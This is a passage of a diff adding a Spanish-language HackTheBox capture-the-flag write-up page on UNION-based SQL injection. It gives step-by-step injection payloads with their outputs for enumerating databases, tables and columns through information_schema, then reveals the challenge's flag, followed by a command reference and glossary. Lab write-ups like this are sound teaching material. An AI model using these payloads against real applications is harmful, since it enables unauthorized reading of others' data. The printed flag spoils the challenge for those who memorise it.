+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">user()</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">user@localhost</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">LISTANDO TODAS LAS BASES DE DATOS</span>
+      </div>
+      <div class="prose">
+        <p>Se consulta <code style="color:var(--yellow)">information_schema.schemata</code>, la tabla de metadatos que almacena el nombre de cada base de datos del servidor:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,schema_name FROM information_schema.schemata-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">schema_name</span> FROM <span class="arg">information_schema.schemata</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Databases: <span class="o-green">information_schema, test, halloween_invetory</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">TABLAS DENTRO DE halloween_invetory</span>
+      </div>
+      <div class="prose">
+        <p>Con el nombre de la base de datos confirmado, se listan sus tablas filtrando por <code style="color:var(--yellow)">table_schema=database()</code> (evita tener que escribir el nombre literal):</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables WHERE table_schema=database()-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">table_name</span> FROM <span class="arg">information_schema.tables</span> WHERE <span class="arg">table_schema=database()</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Tables: <span class="o-red">flag</span>, <span class="o-green">inventory</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// HALLAZGO</p>
+        <p>Además de la tabla esperada <strong>inventory</strong>, existe una tabla llamada <strong>flag</strong> — el objetivo final del reto.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">COLUMNAS DE inventory Y flag</span>
+      </div>
+      <div class="prose">
+        <p>Se enumeran las columnas de cada tabla consultando <code style="color:var(--yellow)">information_schema.columns</code>, filtrando por <code style="color:var(--yellow)">table_schema</code> y <code style="color:var(--yellow)">table_name</code>:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='inventory'-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">column_name</span> FROM <span class="arg">information_schema.columns</span> WHERE <span class="arg">table_schema=database()</span> AND <span class="arg">table_name='inventory'</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Columns [inventory]: <span class="o-green">id, name, description, origin, created_at</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='flag'-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">column_name</span> FROM <span class="arg">information_schema.columns</span> WHERE <span class="arg">table_schema=database()</span> AND <span class="arg">table_name='flag'</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[<span class="o-cyan">-</span>] Columns [flag]: <span class="o-red">flag</span></div>
+      </div>
+
+      <div class="prose">
+        <p>La tabla <code style="color:var(--yellow)">flag</code> tiene una única columna, también llamada <code style="color:var(--yellow)">flag</code> — todo listo para la extracción final.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- FLAG -->
+    <div class="section" id="flag">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Extracción de la Flag</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">CONSULTA DIRECTA A LA TABLA flag</span>
+      </div>
+      <div class="prose">
+        <p>Con la tabla y columna conocidas, basta con seleccionarla directamente en la quinta posición del UNION:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,flag FROM flag-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">flag</span> FROM <span class="arg">flag</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-red">HTB{un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?}</span></div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">FLAG</div><div class="cred-val">HTB{un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?}</div></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">BONUS — RECONSTRUYENDO LA CONSULTA ORIGINAL</span>
+      </div>
+      <div class="prose">
+        <p>
+          A modo de verificación, se reconstruye la consulta original alineando cada nombre de columna
+          real de <code style="color:var(--yellow)">inventory</code> en lugar de los enteros de prueba,
+          confirmando que el orden y los tipos de datos son compatibles:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT id,name,description,origin,created_at FROM inventory-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT <span class="arg">id,name,description,origin,created_at</span> FROM <span class="arg">inventory</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div>10 filas devueltas — coinciden exactamente con el listado original del inventario, confirmando el mapeo correcto de columnas.</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// LECCIÓN DEL RETO</p>
+        <p>Este challenge ilustra el flujo canónico de una <strong>UNION-Based SQL Injection</strong>: (1) cerrar el contexto de la consulta original, (2) calibrar el número de columnas con enteros de prueba, (3) usar esas posiciones para filtrar contra <strong>information_schema</strong> y mapear la base de datos completa, y (4) pivotar hacia la tabla objetivo. Ninguna herramienta automatizada (sqlmap) fue necesaria — todo se resolvió manualmente desde la barra de búsqueda.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">UNION SELECT</div>
+          <div class="cmd-ref-syntax">' UNION SELECT col1,col2,...-- -</div>
+          <div class="cmd-ref-desc">Combina los resultados de dos consultas SELECT en un único conjunto de resultados, siempre que ambas tengan el mismo número de columnas y tipos de datos compatibles.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-- -</span> comenta el resto de la consulta original (sintaxis MySQL/MariaDB)</li>
+            <li><span>'</span> cierra la comilla simple abierta por la consulta vulnerable</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">@@version</div>
+          <div class="cmd-ref-syntax">SELECT @@version</div>
+          <div class="cmd-ref-desc">Variable de sistema global de MySQL/MariaDB que devuelve la versión exacta del motor de base de datos en ejecución.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>database()</span> devuelve el nombre del esquema activo</li>
+            <li><span>user()</span> devuelve usuario y host de la conexión actual</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">information_schema.tables</div>
+          <div class="cmd-ref-syntax">SELECT table_name FROM information_schema.tables WHERE table_schema=...</div>
+          <div class="cmd-ref-desc">Tabla de metadatos que lista todas las tablas existentes en un esquema dado, sin necesidad de credenciales administrativas.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>table_schema</span> filtra por nombre de base de datos</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">information_schema.columns</div>
+          <div class="cmd-ref-syntax">SELECT column_name FROM information_schema.columns WHERE table_name=...</div>
+          <div class="cmd-ref-desc">Tabla de metadatos que lista todas las columnas de una tabla específica, incluyendo su nombre exacto para construir consultas posteriores.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>table_schema + table_name</span> acotan la búsqueda a una tabla concreta</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+        <div class="glos-card">
+          <div class="glos-term">SQL Injection (Inyección SQL)</div>
+          <div class="glos-def">Vulnerabilidad que ocurre cuando una aplicación concatena entrada del usuario directamente dentro de una consulta SQL sin sanitización ni uso de <strong>consultas parametrizadas</strong>. Permite a un atacante alterar la lógica de la consulta original para leer, modificar o eliminar datos arbitrarios.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">UNION-Based SQL Injection</div>
+          <div class="glos-def">Técnica de explotación que aprovecha el operador <code>UNION</code> de SQL para combinar los resultados de una consulta maliciosa con los de la consulta original vulnerable, mostrando datos arbitrarios directamente en la respuesta de la aplicación — a diferencia de la inyección ciega, no requiere inferencia carácter por carácter.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">information_schema</div>
+          <div class="glos-def">Base de datos especial presente en MySQL/MariaDB que contiene <strong>metadatos sobre todas las demás bases de datos</strong> del servidor: nombres de esquemas, tablas, columnas y tipos de datos. Es el primer objetivo de cualquier inyección SQL orientada a extracción de datos, ya que permite mapear la estructura completa antes de extraer contenido real.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Comentarios SQL (-- -)</div>
+          <div class="glos-def">En MySQL/MariaDB, la secuencia <code>-- </code> (doble guión seguido de un espacio) inicia un comentario de línea que descarta el resto de la consulta. Se añade un guión adicional (<code>-- -</code>) por convención para asegurar que exista un carácter después del espacio cuando algunos frameworks de URL recortan espacios finales.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Calibración de columnas (Column Count)</div>
+          <div class="glos-def">Primer paso obligatorio en toda UNION-Based SQLi: determinar cuántas columnas tiene la consulta SELECT original, ya sea mediante <code>ORDER BY n</code> incremental (hasta que falle) o probando <code>UNION SELECT 1,2,3...</code> con un número creciente de literales hasta que la consulta no produzca error y los valores de prueba aparezcan en la respuesta.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">MariaDB</div>
+          <div class="glos-def">Sistema de gestión de bases de datos relacional, fork de código abierto de MySQL creado por sus desarrolladores originales tras la adquisición de MySQL por Oracle. Mantiene compatibilidad casi total con la sintaxis y el catálogo <code>information_schema</code> de MySQL.</div>
+        </div>
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
